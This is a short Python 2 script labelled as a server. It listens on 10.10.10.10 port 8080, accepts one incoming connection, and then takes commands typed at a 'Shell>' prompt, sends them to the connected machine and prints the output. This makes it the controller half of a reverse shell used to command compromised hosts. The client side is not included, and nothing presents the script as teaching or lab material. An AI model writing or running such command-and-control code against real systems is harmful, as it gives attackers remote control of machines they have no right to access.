#Server

import socket       #For building TCP Connection

def connect():

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind(("10.10.10.10",8080))   #Specify the IP address and Port number
    s.listen(1)  #For listening to one connection 
    conn,addr=s.accept()
    print '[+] We got a connection from: ',addr

    while True:
        command=raw_input("Shell> ") 

        if 'terminate' in command:
            conn.send('terminate')
            conn.close() #Close the socket
            break

        else:
            conn.send(command)  #Send command
            print conn.recv(1024)

def main():
    connect()
main()
